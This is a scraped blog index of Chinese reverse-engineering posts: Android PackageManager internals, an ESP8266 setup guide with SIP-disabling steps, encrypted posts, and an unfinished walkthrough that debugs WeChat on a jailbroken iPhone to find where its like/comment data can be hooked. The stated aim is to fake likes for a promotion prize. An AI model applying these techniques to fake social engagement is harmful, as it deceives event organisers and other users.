mRemote对象是IBinder类型，是对IPackageManager.Stub的引用 重写了asBinder()方法，返回mRemote 实现了AIDL文件定义的接口 PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能： 安装/卸载/更新应用，包括 installPackage/ 查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表 查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象 查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象 增加/删除权限，包括 addPermission/removePermission 清除用户数据/缓存/代码等 PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集 ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法 PackageManagerService 继承了 IPackageManager.Stub 因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法 参考 http://androidxref.com/8.1.0_r33/xref/ https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6 http://solart.cc/2016/10/30/install_apk/ https://www.jianshu.com/p/4f16421d5c7f","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"Android","slug":"Android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"}]},{"title":"Arduino ESP8266开发板上手实践","date":"2019-07-30T02:46:35.000Z","path":"2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/","text":"Arduino ESP8266开发板上手实践环境搭建（macOS）官方说明：https://github.com/esp8266/Arduino 安装IDE （Arduino IDE） 下载地址：https://www.arduino.cc/en/main/software 还有种方式是利用Makefile去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。 下载ESP8266硬件包 1 、在设置里面的附加板管理器网址中增加以下链接https://arduino.esp8266.com/stable/package_esp8266com_index.json 2、在工具中找到你的开发板，然后进入开发板管理器，搜索esp8266安装该库，我这里已经安装了。 注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考这里 运行示例代码 我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。 代码如下 /* ESP8266 Blink by Simon Peter Blink the blue LED on the ESP-01 module This example code is in the public domain The blue LED on the ESP-01 module is connected to GPIO1 (which is also the TXD pin; so we cannot use Serial.print() at the same time) Note that this sketch uses LED_BUILTIN to find the pin with the internal LED */ void setup() { pinMode(LED_BUILTIN, OUTPUT); // Initialize the LED_BUILTIN pin as an output } // the loop function runs over and over again forever void loop() { digitalWrite(LED_BUILTIN, LOW); // Turn the LED on (Note that LOW is the voltage level // but actually the LED is on; this is because // it is active low on the ESP-01) delay(1000); // Wait for a second digitalWrite(LED_BUILTIN, HIGH); // Turn the LED off by making the voltage HIGH delay(2000); // Wait for two seconds (to demonstrate the active low LED) } 在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。 重要！！！一些坑以及注意点下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。 确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。 1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。下载地址1 下载地址2 下载地址3在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。 2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过Virtual COM Port去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的/dev目录下并没有出现对应的文件。之前的驱动大多是这个CH340G CH34G CH34X Mac OS X driver 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在这里。安装完以后在/dev就应该有一个tty.SLAB_USBtoUART的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。 资源链接这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下 https://www.arduino.cc/en/guide/macOSX?setlang=cn 在Mac OS X系统上入门Arduino/ Genuino https://juejin.im/post/5b569026e51d4513ee6dd509 Esp8266+Arduino+Mac开发环境搭建 https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/ Program an ESP8266 from Arduino on MacOS https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver CH340G CH34G CH34X Mac OS X driver http://www.nodemcu.com 资料下载访问官网 https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg NODEMCU资料 http://www.wch.cn/download/CH341SER_MAC_ZIP.html mac串口驱动下载地址 https://freeware.the-meiers.org/ CoolTerm串口监控工具下载 SIP禁用步骤 1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r 2. 终端中输入csrutil disable/status/enabled 3. 重启mac AVR逆向基础下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。 由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。 我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。 AVR refers to the line of MCUs manufactured by Atmel and used in the original designs. 由于ida对这个执行文件的支持不是很好，我们准备用radare2来分析这个bin文件。 参考 https://blog.csdn.net/iotisan/article/details/78766463 和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路 https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/ Any NodeMCU esp8266 Drivers for MacOS Mojave?","tags":[{"name":"Arduino","slug":"Arduino","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"},{"name":"IOT","slug":"IOT","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"}]},{"title":"Electron跨平台App实战分析","date":"2019-07-29T03:59:49.000Z","path":"2019/07/29/Electron-app-reversing/Electron-app-reversing/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[{"name":"Electron","slug":"Electron","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"},{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"}]},{"title":"Android完全禁用Accessibility（通杀一切基于此的外挂）","date":"2019-07-24T12:02:54.000Z","path":"2019/07/24/android-disableAccessibility/android-disableAccessibility/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"Accessibility","slug":"Accessibility","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"}]},{"title":"微信集赞/评论插件分析及开发","date":"2019-07-22T02:22:01.000Z","path":"2019/07/22/fkwechatLike/fkwechatLike/","text":"微信集赞/评论插件分析及开发开始为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！ 理性分析再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。 准备条件 一台mac 一台越狱的iOS设备 ida/Hooper/theos flex/issh/xia0LLDB 其他常见逆向工具等 对于一贯喜欢上调试器分析得我，所以写了iSSH和xia0LLDB两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。 逆向分析逆向赞和评论的数据模型一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为WCTimeLineViewController而且界面是一个UITableView 将wechat执行文件拖入Hooper（wechat文件太大，ida分析会很卡）找到UITableView的代理方法：-[WCTimeLineViewController tableView:cellForRowAtIndexPath:] 这里面肯定会根据模型去设置cell数据 r2 = [r28 section]; var_70 = r25; r24 = [r25 calcDataItemIndex:r2]; r25 = [[MMServiceCenter defaultCenter] retain]; r2 = [WCFacade class]; var_78 = r28; r0 = [r25 getService:r2]; r0 = [r0 retain]; r24 = [[r0 getTimelineDataItemOfIndex:r24] retain]; [r0 release]; [r25 release]; r19 = [[MMServiceCenter defaultCenter] retain]; r0 = [r19 getService:[WCFacade class]]; r0 = [r0 retain]; r25 = [[r0 getLayerIdForDataItem:r24] retain]; [r0 release]; [r19 release]; r19 = [[MMServiceCenter defaultCenter] retain]; r0 = [r19 getService:[WCFacade class]]; r0 = [r0 retain]; r20 = r0; r0 = [r0 getShowTip:r24 layerId:r25]; r29 = r29; r26 = [r0 retain]; [r20 release]; [r19 release]; 整理下来就是 [[MMServiceCenter defaultCenter] getService:[WCFacade class]]会得到一个WCFacade对象，然后通过 [WCFacade getTimelineDataItemOfIndex:]就能得到cell的数据 看到这里，上调试器！看下都是什么数据… 将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信 直接输入issh debug -a wechat就能挂上微信 xia0 ~ $ issh debug -a wechat [I]:iproxy process for 2222 port alive, pid=1382 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=1395 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat 打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本） xia0 ~ $ lldb &quot;xutil&quot; command installed -&gt; xutil &quot;choose&quot; command installed -&gt; choose &quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:] &quot;sbt&quot; command installed -&gt; sbt // 连接到远端 (lldb) pcc 这里有两种方法： 一种是用xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;下断点去查看； // 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点 (lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot; (lldb) c 第二种是由于lldb支持choose命令，可以直接拿到WCFacade对象。既然如此选choose (lldb) choose WCFacade &lt;__NSArrayM 0x2823d9860&gt;( &lt;WCFacade: 0x139e1c030&gt; ) 调用其getTimelineDataItemOfIndex:方法就能拿到第一条朋友圈的数据 (lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0] Class name: WCDataItem, addr: 0x13e2871d0 tid: 13121667995275047007 username: wxid_6913ohfkk7kq12 createtime: 1564224719 commentUsers: ( ) contentObj: &lt;WCContentItem: 0x2801f5500&gt; 输入ivars 0x13e2871d0就能拿到对象的所有属性值 (lldb) ivars 0x13e2871d0 &lt;WCDataItem: 0x13e2871d0&gt;: in WCDataItem: cid (int): 0 tid (NSString*): @&quot;13121667995275047007&quot; type (int): 0 flag (int): 0 username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot; nickname (NSString*): @&quot;xia0&quot; createtime (int): 1564224719 locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt; likeFlag (BOOL): NO likeCount (int): 0 likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt; commentCount (int): 0 commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt; contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt; appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt; contentDesc (NSString*): @&quot;test&quot; 由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。 里面我们还发现了likeUsers和commentUsers的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。 likeCount (int): 1 likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt; 发现赞的数量变为1了，在看下里面的内容 (lldb) po 0x283e37060 &lt;__NSArrayM 0x283e37060&gt;( Class name: WCUserComment username: wxid_6913ohfkk7kq12 nickname: xia0 content: source: 0 type: 1 createTime: 1564225007 isLocalAdded: 0 commentID: (null) comment64ID: (null) refCommentID: (null) refComment64ID: (null) refUserName: bDeleted: 0 ) 正是我自己的微信号。同理可以得到评论 commentCount (int): 1 commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt; (lldb) po 0x283e349c0 &lt;__NSArrayM 0x283e349c0&gt;( Class name: WCUserComment username: wxid_6913ohfkk7kq12 nickname: xia0 content: 评论测试 source: 0 type: 2 createTime: 1564225144 isLocalAdded: 1 commentID: (null) comment64ID: (null) refCommentID: (null) refComment64ID: (null) refUserName: (null) bDeleted: 0 ) 到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。 最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。 寻找HOOK点先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个WCDataItem对象，那么我们可以对WCDataItem里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？ 但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样 (lldb) bt * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1 * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888 frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004 frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340 frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228 frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92 frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992 frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240 frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776 frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248 frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932 但是用我写的sbt命令就能恢复oc符号，下面我们对-[WCDataItem setCid:]下断点，然后得到调用栈 (lldb) sbt ==========================================xia0LLDB========================================== BlockSymbolFile Not Set The Block Symbol Json File, Try &#39;sbt -f&#39; ============================================================================================ frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0 frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004 frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340 frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228 frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92 frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64 frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116 frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48 frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552 frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348 frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233 frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732 frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112 frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336 frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728 frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68 frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84 frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88 frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32 frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884 frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252 frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832 frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452 frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104 frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216 frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268 frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4 可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程 其中里面有个很明显的方法 -[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] 看名字就知道，这个应该就是我们需要的hook点。 整理思路整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。 大概的代码逻辑应该如下 在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈 取出自己朋友圈的赞和评论数据备用 